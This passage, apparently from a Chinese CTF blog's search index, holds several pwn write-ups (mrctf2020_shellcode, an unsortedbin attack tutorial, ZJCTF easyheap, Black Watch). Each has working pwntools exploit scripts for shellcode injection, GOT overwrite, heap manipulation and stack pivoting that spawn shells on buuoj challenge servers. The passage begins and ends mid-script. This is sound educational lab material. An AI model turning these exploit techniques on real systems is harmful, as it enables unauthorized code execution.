pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80io.sendline(p)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"mrctf2020_shellcode","slug":"mrctf2020-shellcode","date":"2022-11-23T13:27:30.000Z","updated":"2023-09-14T17:20:08.000Z","comments":true,"path":"2022/11/23/mrctf2020-shellcode/","link":"","permalink":"http://example.com/2022/11/23/mrctf2020-shellcode/","excerpt":"","text":"这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 没有开NX保护 可以在内存上执行系统调用 拖到ida后发现f5报错 于是只能阅读汇编代码 .text:0000000000001155 ; __unwind &#123;.text:0000000000001155 push rbp.text:0000000000001156 mov rbp, rsp.text:0000000000001159 sub rsp, 410h.text:0000000000001160 mov rax, cs:stdin@@GLIBC_2_2_5.text:0000000000001167 mov esi, 0 ; buf.text:000000000000116C mov rdi, rax ; stream.text:000000000000116F call _setbuf.text:0000000000001174 mov rax, cs:stdout@@GLIBC_2_2_5.text:000000000000117B mov esi, 0 ; buf.text:0000000000001180 mov rdi, rax ; stream.text:0000000000001183 call _setbuf.text:0000000000001188 mov rax, cs:stderr@@GLIBC_2_2_5.text:000000000000118F mov esi, 0 ; buf.text:0000000000001194 mov rdi, rax ; stream.text:0000000000001197 call _setbuf.text:000000000000119C lea rdi, s ; &quot;Show me your magic!&quot; //断点1.text:00000000000011A3 call _puts.text:00000000000011A8 lea rax, [rbp+buf].text:00000000000011AF mov edx, 400h ; nbytes.text:00000000000011B4 mov rsi, rax ; buf .text:00000000000011B7 mov edi, 0 ; fd.text:00000000000011BC mov eax, 0.text:00000000000011C1 call _read //断点2.text:00000000000011C6 mov [rbp+var_4], eax.text:00000000000011C9 cmp [rbp+var_4], 0.text:00000000000011CD jg short loc_11D6 //断点3.text:00000000000011CF mov eax, 0.text:00000000000011D4 jmp short locret_11E4 断点1: 在这之前的汇编代码 执行了两步 一是清空缓存区 防止数据输入输出出现问题 第二步调用puts函数输出了一段字符串 断点2: 调用了read函数 可以手动反编译为read(0,buf,0x400) 断点3: 紧接着将**$eax的值赋给rbp+var_4** 与0进行比较 cmp的功能相当于减法指令，只是不保存结果 jg指令 如果大于就跳转 即如果$eax大于0就跳转到loc_11D6函数 .text:00000000000011D6 loc_11D6: ; CODE XREF: main+78↑j.text:00000000000011D6 lea rax, [rbp+buf].text:00000000000011DD call rax.text:00000000000011DF mov eax, 0 lea指令将$rbp+buf即我们上面通过read输入的变量的地址赋值给rax 随后利用call指令调用这个地址的内容 也就是说我们只要直接输入shellcode就可以做到系统调用 exp: from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29656elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;Show me your magic!&quot;)context.arch = &quot;amd64&quot;shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"unsortedbinAttack","slug":"unsortedbinAttack","date":"2022-11-21T11:50:21.000Z","updated":"2023-09-14T17:20:56.000Z","comments":true,"path":"2022/11/21/unsortedbinAttack/","link":"","permalink":"http://example.com/2022/11/21/unsortedbinAttack/","excerpt":"","text":"距离上一篇堆的知识点很长时间了 这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法 本文讲述unsortedbin在不同环境下的利用办法 这一部分还是比较简单的 基础知识这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin 我们先留意一下随着glibc版本的不同 接着说回正文 一个堆块被释放以后 如果他的大小大于fastbin或者tcache的范围 那么他就会先进入unsortedbin 如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arean+0x88（这里的数值不是固定的） 此时如果用户再次申请一个chunk 1.如果该chunk的大小不超过unsortedbin中的chunk大小 那么就会分割出用户需要的 比如此时我再次申请一个0x40大小的堆块 就是从原来的free chunk中分割出来的 并且其fd和bk域的数值会保留下来 一起分配给了用户 所以我们可以利用这个特性泄露libc基址(如果程序有打印出chunk内容的机会) 这里有个小疑点 为什么用户新申请出来的chunk的fd和bk会和原来的chunk的不一样(待解) ubuntu16.04泄露基址[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 自己编译了一个简单的堆题 程序主体就简单发一下各函数就行了 内容也不必看 就知道有个打印chunk内容的机会和堆溢出 uaf等漏洞 int create()&#123; void *v0; // rax int v2; // [rsp+0h] [rbp-10h] BYREF int v3; // [rsp+4h] [rbp-Ch] BYREF void *v4; // [rsp+8h] [rbp-8h] printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); LODWORD(v0) = v3; if ( v3 &lt;= 31 ) &#123; v0 = *(&amp;Page + v3); if ( !v0 ) &#123; printf(&quot;Size &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( v2 &gt; 256 ) &#123; LODWORD(v0) = puts(&quot;over size&quot;); &#125; else &#123; v0 = malloc(v2); v4 = v0; if ( v0 ) &#123; *(&amp;Page + v3) = v4; Size[v3] = v2; LODWORD(v0) = puts(&quot;OK&quot;); &#125; &#125; &#125; &#125; return v0;&#125; __int64 edit()&#123; __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) &#123; result = *(&amp;Page + v1); if ( result ) &#123; printf(&quot;Content: &quot;); result = vuln(*(&amp;Page + v1), Size[v1]); &#125; &#125; return result;&#125; int show()&#123; int result; // eax int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) result = printf(&quot;Content: %s\\n&quot;, *(&amp;Page + v1)); return result;&#125; __int64 del()&#123; __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) &#123; free(*(&amp;Page + v1)); *(&amp;Page + v1) = 0LL; result = v1; Size[v1] = 0; &#125; return result;&#125; gdb动调exp: from pwn import*io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;def create(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size))def edit(index,payload): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))create(1,0x88)create(2,0x20)delete(1)create(3,0x48)show(3)io.recv() [DEBUG] Received 0x2e bytes: 00000000 43 6f 6e 74 65 6e 74 3a 20 f8 7b d4 61 1a 7f 0a │Cont│ent:│ ·&#123;·│a···│ 00000010 31 2e 41 44 44 0a 32 2e 43 48 41 4e 47 45 0a 33 │1.AD│D·2.│CHAN│GE·3│ 00000020 2e 50 52 49 4e 54 0a 34 2e 44 45 4c 0a 3a │.PRI│NT·4│.DEL│·:│ 0000002e 最后成功泄露出libc地址 ubuntu 18.04泄露基址二进制文件同上 exp: from pwn import*io = process(&quot;./heap&quot;)elf = ELF(&quot;./heap&quot;)context.log_level = &quot;debug&quot;def create(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size))def edit(index,payload): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))create(1,0x90)create(2,0x20)for i in range(3,10): create(i,0x90)for i in range(3,10): delete(i)delete(1)create(10,0x90)show(10) 办法就是利用 tcachebin的一条链表中只能存放7个chunk 只要我们把其填满了 那么再次释放一个相同大小的chunk就会进入unsortedbin 这里将我们最开始申请的chunk1释放以后 其就因为对应的tcachebin中位置已满 所以进入了unsortedbin 那么接下来利用show函数输出即可 [DEBUG] Received 0x2e bytes: 00000000 43 6f 6e 74 65 6e 74 3a 20 30 7d 05 ac 42 7f 0a │Cont│ent:│ 0&#125;·│·B··│ 00000010 31 2e 41 44 44 0a 32 2e 43 48 41 4e 47 45 0a 33 │1.AD│D·2.│CHAN│GE·3│ 00000020 2e 50 52 49 4e 54 0a 34 2e 44 45 4c 0a 3a │.PRI│NT·4│.DEL│·:│ 0000002e 这里同时也说明了一点 当tcachebin和unsortedbin中都有free chunk时 且用户申请的chunk大小小于等于二者时unsortedbin优先提供给用户 任意地址写如果单独利用那么是比较鸡肋的一个漏洞点 但是如果配合其他漏洞一起使用 效果非常强大 主要利用的是unsortedbin取出后 会对其链表进行清空 /* remove from unsorted list */ if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;); unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); 其中bck在代码开始进行了赋值 bck &#x3D; victim-&gt;bk; 也就是说如果我们修改了victim的bk域 就会使得unsorted_chunks (av)+0x18处修改为我们修改的bk域 以及我们修改的地址+0x10处填入unsorted_chunks (av) 调试环境 libc2.27 bss_addr = 0x602200add(0x410,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)payload = p64(0)+p64(bss_addr-0x10)edit(0,len(payload),payload)add(0x410,b&#x27;aaaa&#x27;)#2debug() chunk1用来防止chunk0进入unsortedbin后和top chunk合并 修改chunk0的bk域为bss_addr-0x10 这样到时候bss_addr 就会被写入unsorted_chunks (av) 动调看一下 你会发现这时候由于main_arena的结构被破坏了 plmalloc仍然认为chunk0处于free状态 但是我们的chunk2确实是申请到了chunk0的空间 这时候如果我们想要再次申请一个chunk 就会报错 这一点要注意 此时各地址的值都如我们预期想象的那样 unsorted bin into stack漏洞的原理在于 plmalloc在申请chunk的时候会先去unsortebin中寻找合适的chunk 如果size不符合则通过bk指针索引下一个 如果我们修改chunk的size和bk 就可以误导plmalloc去对我们构造的fake chunk进行检查 如果通过了检查 就会分配fake chunk给用户 跟着下面这个程序动调一下就清楚了(不是我写的 我也不知道出处 可能是how2heap的?) #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main() &#123; intptr_t stack_buffer[4] = &#123;0&#125;; fprintf(stderr, &quot;Allocating the victim chunk&quot;); intptr_t* victim = malloc(0x100); fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()&quot;); intptr_t* p1 = malloc(0x100); fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin&quot;, victim); free(victim); fprintf(stderr, &quot;Create a fake chunk on the stack&quot;); fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointern&quot;); fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_memn&quot;); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %pn&quot;, &amp;stack_buffer[2]); fprintf(stderr, &quot;malloc(0x100): %pn&quot;, malloc(0x100));&#125; 编译指令: gcc -g xxx.c //加-g动调的时候就可以依据代码逐行进行 首先是申请了两个chunk chunk0用来误导plmalloc chunk1用来防止chunk0和top chunk合并 释放chunk0 进入unsortedbin 伪造局部变量数组(也就是位于栈上的一块内存) 修改size域和bk域 bk域是为了迎合检查 双向链表的完整性 修改chunk0的size域和bk域 误导plmalloc 最后申请一个0x100大小的chunk 分配到的区域为栈上的数组 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"ZJCTF 2019.easyheap","slug":"ZJCTF-2019-easyheap","date":"2022-11-21T09:05:17.000Z","updated":"2023-09-14T17:21:02.000Z","comments":true,"path":"2022/11/21/ZJCTF-2019-easyheap/","link":"","permalink":"http://example.com/2022/11/21/ZJCTF-2019-easyheap/","excerpt":"","text":"这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用 分析一下程序 [*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 没有开启FULL RELRO 意味着可以覆写got表 ida继续跟进 main函数很常规 这里重点关注一下add free edit这三个函数 unsigned __int64 create_heap()&#123; int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i &lt;= 9; ++i ) &#123; if ( !*(&amp;heaparray + i) ) &#123; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); size = atoi(buf); *(&amp;heaparray + i) = malloc(size); if ( !*(&amp;heaparray + i) ) &#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; printf(&quot;Content of heap:&quot;); read_input(*(&amp;heaparray + i), size); puts(&quot;SuccessFul&quot;); return __readfsqword(0x28u) ^ v4; &#125; &#125; return __readfsqword(0x28u) ^ v4;&#125; 申请的堆块存储到了bss段上的heaparray数组里面 同时每个指针占据8个字节 unsigned __int64 edit_heap()&#123; int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); v2 = atoi(buf); printf(&quot;Content of heap : &quot;); read_input(*(&amp;heaparray + v1), v2); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v4;&#125; 提供了堆溢出的机会 可以供我们修改size域来合并chunk unsigned __int64 delete_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; free(*(&amp;heaparray + v1)); *(&amp;heaparray + v1) = 0LL; puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; free后把指针清零了 没有办法uaf 了解完程序主体后 结合一下版本为ubuntu16 没有tcache 并且还有堆溢出 可以合并堆块 从而获得两个指向同一空间的chunk 这样就可以修改fastbinchunk的fd域 获得任意地址写的机会 接着再来关注一下这个heaparray 我们看完了代码后 可以得知 edit函数 是修改heaparray所指向的地址的内容 那如果我们利用上文提到的任意写的漏洞 将heaparray的其中一个指针修改为free_got 那么不就可以修改got表 成功进行系统调用了 不过fastbin attack需要注意的是 glibc对其取出bin时有检查机制 我们的fakechunk的地址需要合理构造 才能成功取出 from pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,29611)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)def add(size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap:&quot;) io.sendline(payload) io.recvuntil(&quot;SuccessFul&quot;)def edit(index,size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap : &quot;) io.sendline(payload) io.recvuntil(&quot;Done !&quot;)def delete(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Done !&quot;)free_got = elf.got[&#x27;free&#x27;]system_addr = 0x400700heaparray_addr = 0x6020E0add(0x18,b&quot;1&quot;)#0add(0x68,b&quot;1&quot;)#1add(0x68,b&quot;1&quot;)#2add(0x20,b&quot;1&quot;)#3payload = cyclic(0x18)+p16(0xe1)edit(0,len(payload),payload)delete(1)add(0x68,b&quot;1&quot;)#4&amp;1add(0x68,b&quot;1&quot;)#5&amp;2delete(2)payload = p64(heaparray_addr-51)edit(4,len(payload),payload) 这部分代码的思路 我前面几题堆wp也有涉及 老办法了 不懂具体流程的可以翻看以往wp 重点在于最后我们要任意写的地方 位于heaparray-51的地方 这是为什么？ 我们gdb动调看看 如果不-51的话 此时我们想要伪造的chunk的size域值为878030 不符合glibc的检查机制 如果想要申请出来时 程序就会强行终止 [DEBUG] Received 0x9b3 bytes: b&quot;*** Error in `./pwn&#x27;: malloc(): memory corruption (fast): 0x00000000006020f0 ***\\n&quot; b&#x27;======= Backtrace: =========\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f93309967f5]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x82679)[0x7f93309a1679]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f93309a31d4]\\n&#x27; b&#x27;./pwn[0x4009b5]\\n&#x27; b&#x27;./pwn[0x400ce1]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f933093f840]\\n&#x27; b&#x27;./pwn[0x4007b9]\\n&#x27; b&#x27;======= Memory map: ========\\n&#x27; b&#x27;00400000-00402000 r-xp 00000000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;00601000-00602000 r--p 00001000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;00602000-00603000 rw-p 00002000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;02381000-023a2000 rw-p 00000000 00:00 0 [heap]\\n&#x27; b&#x27;7f932c000000-7f932c021000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f932c021000-7f9330000000 ---p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330709000-7f933071f000 r-xp 00000000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933071f000-7f933091e000 ---p 00016000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933091e000-7f933091f000 rw-p 00015000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933091f000-7f9330adf000 r-xp 00000000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330adf000-7f9330cdf000 ---p 001c0000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330cdf000-7f9330ce3000 r--p 001c0000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330ce3000-7f9330ce5000 rw-p 001c4000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330ce5000-7f9330ce9000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330ce9000-7f9330d0f000 r-xp 00000000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330ef4000-7f9330ef7000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330f0d000-7f9330f0e000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330f0e000-7f9330f0f000 r--p 00025000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330f0f000-7f9330f10000 rw-p 00026000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330f10000-7f9330f11000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7ffc6a9c0000-7ffc6a9e1000 rw-p 00000000 00:00 0 [stack]\\n&#x27; b&#x27;7ffc6a9ed000-7ffc6a9f0000 r--p 00000000 00:00 0 [vvar]\\n&#x27; b&#x27;7ffc6a9f0000-7ffc6a9f2000 r-xp 00000000 00:00 0 [vdso]\\n&#x27; b&#x27;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]\\n&#x27; 于是我们只好利用gdb动调 最后在-51的位置 可以使我们构造的chunk结构通过glibc的检查 add(0x68,b&quot;/bin/sh&quot;)add(0x68,b&quot;1&quot;)payload = cyclic(51)+p64(free_got)edit(5,len(payload),payload)payload = p64(system_addr)edit(2,len(payload),payload)io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;3&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;4&quot;)io.interactive() 随后我们将该chunk申请出来 并且计算一下偏移 将我们想要修改的heaparray覆盖成free_got 这样我们下次想要利用edit函数修改其内容时 就会转化成修改free_got的内容 然后我们释放掉一个内容为&#x2F;bin&#x2F;sh的堆块 就相当于执行了system（”&#x2F;bin&#x2F;sh”） 但是在这里我遇到了个问题 不能使用我们之前为了方便打包好的函数 因为多接收了个done 但是系统调用后并不会输出done 所以这里会有卡壳 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"Black Watch 入群题","slug":"Black-Watch-入群题","date":"2022-11-18T14:45:27.000Z","updated":"2023-09-14T17:18:44.000Z","comments":true,"path":"2022/11/18/Black-Watch-入群题/","link":"","permalink":"http://example.com/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/","excerpt":"","text":"做的时候发现忘记了好多知识点 复现一下 不然本来这题的知识点以前的博客都有讲到 [*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没开金丝雀和pie 32位 ida看看 ssize_t vul_function()&#123; size_t v0; // eax size_t v1; // eax char buf[24]; // [esp+0h] [ebp-18h] BYREF v0 = strlen(m1); write(1, m1, v0); read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); return read(0, buf, 0x20u);&#125; 关键函数 给了两次溢出的机会 第二次只能溢出两个字长 看到这里就应该反应过来是栈迁移 第一个read写入的地址是bss段 这里我一开始想的是写入shellcode 打不通后仔细想了想 重新学习了NX保护 NX保护简单理解就是使内存页的数据不可执行 那为什么我们可以构造rop链呢 因为rop链的执行流控制是利用栈帧的ret指令来实现的 from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload) 说一下思路吧 第一个read构造write泄露基址 然后要返回main函数 进行下一次的system系统调用 然后栈迁移到对应的地址-4 这里的-4前面的专门讲解栈迁移的篇幅有提到 接下来就是构造system的链 然后执行了 exp: from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27820elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;What is your name?&quot;)puts_plt = 0x8048350write_plt = 0x8048380write_got = elf.got[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)bss_addr = 0x804A300leave_addr = 0x08048408payload = cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)write_addr = u32(io.recv())system_addr,binsh_addr = libcmath(write_addr,&#x27;write&#x27;)io.recvuntil(&quot;What is your name?&quot;)payload = p32(system_addr)+p32(0)+p32(binsh_addr)io.send(payload)io.recvuntil(&quot;What do you want to say?&quot;)payload = 